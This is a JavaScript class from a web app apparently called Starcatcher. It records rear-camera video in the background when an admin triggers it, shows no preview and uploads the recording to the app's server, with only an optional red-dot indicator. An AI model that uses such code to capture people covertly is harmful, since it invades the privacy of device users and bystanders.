/**
 * Starcatcher – Background Video Recording
 * Records video (no audio) in the background when triggered by admin.
 * No camera preview is shown to the user.
 * Uses device enumeration to explicitly select the rear (back) camera.
 */

class BackgroundRecorder {
    constructor() {
        this.stream = null;
        this.mediaRecorder = null;
        this.chunks = [];
        this.isRecording = false;
        this.uploadUrl = '/api/upload';
        this.indicatorEl = document.getElementById('record-indicator');
    }

    /**
     * Find the rear camera deviceId by enumerating all video devices.
     * Returns the deviceId or null if not found.
     */
    async _findRearCameraId() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === 'videoinput');

            console.log('Available cameras:', videoDevices.map(d => `${d.label} (${d.deviceId.substring(0, 8)}...)`));

            if (videoDevices.length === 0) return null;
            if (videoDevices.length === 1) return videoDevices[0].deviceId;

            // Look for rear/back/environment camera by label
            const rearCamera = videoDevices.find(d => {
                const label = (d.label || '').toLowerCase();
                return label.includes('back') ||
                    label.includes('rear') ||
                    label.includes('rück') ||
                    label.includes('environment') ||
                    label.includes('facing back') ||
                    label.includes('camera 0') ||
                    label.includes('camera2 0');  // Some Android devices
            });

            if (rearCamera) {
                console.log('Found rear camera by label:', rearCamera.label);
                return rearCamera.deviceId;
            }

            // If labels are empty (permission not yet granted), return last device
            // On most phones, the last video device is the rear camera
            if (!videoDevices[0].label) {
                console.log('Camera labels not available, using last device (likely rear)');
                return videoDevices[videoDevices.length - 1].deviceId;
            }

            // Fallback: use the last device (usually rear on mobile)
            console.log('No clear rear camera found, using last device');
            return videoDevices[videoDevices.length - 1].deviceId;

        } catch (err) {
            console.warn('Device enumeration failed:', err);
            return null;
        }
    }

    /**
     * Start background recording (video only, no audio)
     */
    async start() {
        if (this.isRecording) return;

        try {
            // Strategy 1: Try to find rear camera by device enumeration
            const rearId = await this._findRearCameraId();

            if (rearId) {
                try {
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: { deviceId: { exact: rearId }, width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: false
                    });
                    console.log('✅ Using rear camera via deviceId');
                } catch (idErr) {
                    console.warn('deviceId selection failed:', idErr);
                    this.stream = null;
                }
            }

            // Strategy 2: Try facingMode exact
            if (!this.stream) {
                try {
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: false
                    });
                    console.log('✅ Using rear camera via facingMode exact');
                } catch (exactErr) {
                    console.warn('facingMode exact failed:', exactErr);
                }
            }

            // Strategy 3: Try facingMode preferred
            if (!this.stream) {
                this.stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });
                console.log('⚠️ Using facingMode preferred (may be front camera)');
            }

            this.chunks = [];

            try {
                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
                    ? 'video/webm;codecs=vp9'
                    : 'video/webm';
                this.mediaRecorder = new MediaRecorder(this.stream, { mimeType });
            } catch (e) {
                this.mediaRecorder = new MediaRecorder(this.stream);
            }

            this.mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) this.chunks.push(e.data);
            };

            this.mediaRecorder.onstop = () => this._upload();

            this.mediaRecorder.start();
            this.isRecording = true;
            this._showIndicator(true);
            console.log('🎬 Background recording started');

        } catch (err) {
            console.error('Camera access error:', err);
        }
    }

    /**
     * Stop background recording and upload
     */
    stop() {
        if (!this.isRecording || !this.mediaRecorder) return;

        try {
            if (this.mediaRecorder.state !== 'inactive') {
                this.mediaRecorder.stop();
            }
        } catch (e) {
            console.warn('Stop error:', e);
        }

        this.isRecording = false;
        this._showIndicator(false);

        // Release camera
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }

        console.log('⏹️ Background recording stopped');
    }

    /**
     * Upload recorded video to server
     */
    async _upload() {
        if (this.chunks.length === 0) return;

        const blob = new Blob(this.chunks, { type: 'video/webm' });
        this.chunks = [];

        const baseUrl = (window.CROWDFLASH_CONFIG && window.CROWDFLASH_CONFIG.BACKEND_URL)
            ? window.CROWDFLASH_CONFIG.BACKEND_URL.replace('wss://', 'https://').replace('ws://', 'http://')
            : '';

        try {
            const response = await fetch(baseUrl + this.uploadUrl, {
                method: 'POST',
                body: blob,
                headers: {
                    'X-Filename': `rec_${Date.now()}.webm`
                }
            });

            const data = await response.json();
            if (data.success) {
                console.log('✅ Video uploaded:', data.filename);
            } else {
                throw new Error('Upload failed');
            }
        } catch (err) {
            console.error('❌ Upload error:', err);
        }
    }

    /**
     * Show/hide recording indicator (small red dot)
     */
    _showIndicator(visible) {
        if (this.indicatorEl) {
            this.indicatorEl.style.display = visible ? 'flex' : 'none';
        }
    }
}

// Export
window.BackgroundRecorder = BackgroundRecorder;
